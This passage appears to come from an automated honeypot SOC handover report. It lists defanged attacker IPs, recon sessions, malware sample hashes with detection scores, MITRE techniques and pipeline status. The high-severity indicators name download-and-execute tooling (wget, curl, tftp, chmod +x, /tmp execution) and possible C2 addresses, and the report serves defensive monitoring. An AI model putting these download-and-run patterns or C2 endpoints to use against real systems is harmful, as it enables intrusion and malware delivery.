- [ ] Block `104.248.251[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a49e1f816003

| Field | Detail |
|---|---|
| **Source IP** | `65.20.187[.]47` |
| **First Seen** | 2026-07-16 22:53 |
| **Last Seen** | 2026-07-16 22:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:53:50` | `cowrie.session.connect` |
| `2026-07-16 22:53:50` | `cowrie.client.version` |
| `2026-07-16 22:53:50` | `cowrie.client.kex` |
| `2026-07-16 22:53:51` | `cowrie.login.success` |
| `2026-07-16 22:53:52` | `cowrie.direct-tcpip.request` |
| `2026-07-16 22:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.187[.]47` to AbuseIPDB if not already reported
- [ ] Block `65.20.187[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-818b483972bb

| Field | Detail |
|---|---|
| **Source IP** | `78.189.17[.]35` |
| **First Seen** | 2026-07-16 22:53 |
| **Last Seen** | 2026-07-16 22:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:53:57` | `cowrie.session.connect` |
| `2026-07-16 22:53:57` | `cowrie.client.version` |
| `2026-07-16 22:53:57` | `cowrie.client.kex` |
| `2026-07-16 22:53:58` | `cowrie.login.success` |
| `2026-07-16 22:53:59` | `cowrie.direct-tcpip.request` |
| `2026-07-16 22:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.189.17[.]35` to AbuseIPDB if not already reported
- [ ] Block `78.189.17[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `161.35.8[.]0` | **69** | 2026-07-16 20:57 | 2026-07-16 22:52 | 44m | 0 | `T1592` | 🟠 MEDIUM |
| `130.211.102[.]114` | **11** | 2026-07-16 21:07 | 2026-07-16 21:08 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `165.245.241[.]122` | **10** | 2026-07-16 22:45 | 2026-07-16 22:46 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `132.148.73[.]100` | **9** | 2026-07-16 21:10 | 2026-07-16 22:54 | 4m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]152` | **3** | 2026-07-16 21:41 | 2026-07-16 21:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]125` | **3** | 2026-07-16 22:18 | 2026-07-16 22:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `130.131.161[.]148` | **2** | 2026-07-16 21:26 | 2026-07-16 21:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-16 22:10 | 2026-07-16 22:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `46.101.255[.]225` | **2** | 2026-07-16 22:46 | 2026-07-16 22:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.96.238[.]202` | 1 | 2026-07-16 21:02 | 2026-07-16 21:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.248.142[.]195` | 1 | 2026-07-16 22:46 | 2026-07-16 22:46 | 1s | 0 | `T1592` | 🟢 LOW |
| `116.181.19[.]157` | 1 | 2026-07-16 22:15 | 2026-07-16 22:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.213[.]116` | 1 | 2026-07-16 21:24 | 2026-07-16 21:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.105[.]40` | 1 | 2026-07-16 21:25 | 2026-07-16 21:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.18.236[.]71` | 1 | 2026-07-16 22:10 | 2026-07-16 22:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `165.22.66[.]170` | 1 | 2026-07-16 22:46 | 2026-07-16 22:46 | 1s | 0 | `T1592` | 🟢 LOW |
| `167.71.51[.]213` | 1 | 2026-07-16 22:46 | 2026-07-16 22:47 | 21s | 0 | `T1592` | 🟢 LOW |
| `178.178.194[.]134` | 1 | 2026-07-16 22:08 | 2026-07-16 22:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `190.0.81[.]145` | 1 | 2026-07-16 22:42 | 2026-07-16 22:42 | 13s | 0 | `T1592` | 🟢 LOW |
| `203.252.10[.]4` | 1 | 2026-07-16 21:31 | 2026-07-16 21:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `221.228.10[.]226` | 1 | 2026-07-16 20:55 | 2026-07-16 20:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `37.238.163[.]248` | 1 | 2026-07-16 20:55 | 2026-07-16 20:55 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-07-16 22:07 | 2026-07-16 22:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]156` | 1 | 2026-07-16 21:42 | 2026-07-16 21:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]66` | 1 | 2026-07-16 21:00 | 2026-07-16 21:00 | 17s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]76` | 1 | 2026-07-16 22:51 | 2026-07-16 22:52 | 17s | 0 | `T1592` | 🟢 LOW |
| `85.159.164[.]28` | 1 | 2026-07-16 22:32 | 2026-07-16 22:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]60` | 1 | 2026-07-16 22:37 | 2026-07-16 22:37 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `104.248.142[.]195` | DE | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `217.52.226[.]144` | EG | Nile Online | **100** ⚠️ | 1 |
| `49.124.154[.]171` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 31 |
| `61.185.30[.]170` | CN | CHINANET Shanxi(SN) province network | **100** ⚠️ | 50 |
| `218.28.18[.]2` | CN | Dennis Department Store, | **100** ⚠️ | 50 |
| `165.245.241[.]122` | DE | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `101.13.4[.]119` | TW | Taiwan Mobile Co., Ltd. | **100** ⚠️ | 50 |
| `161.35.8[.]0` | US | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `65.20.202[.]4` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `201.63.52[.]54` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 91 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 83 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 2 |

---

## 🔕 False Positive Summary (17 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 236 cases |
| Tool 34  | Credential Extractor        | ✅ 104 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 16 fingerprints |
| Tool 36  | Command Clustering          | ✅ 9 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 91 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 17 filtered (7.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 57 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 33 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 89 priority case(s) shown individually · 28 recon entry/entries in table (9 group(s) consolidating 111 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-16T23:01:32Z_
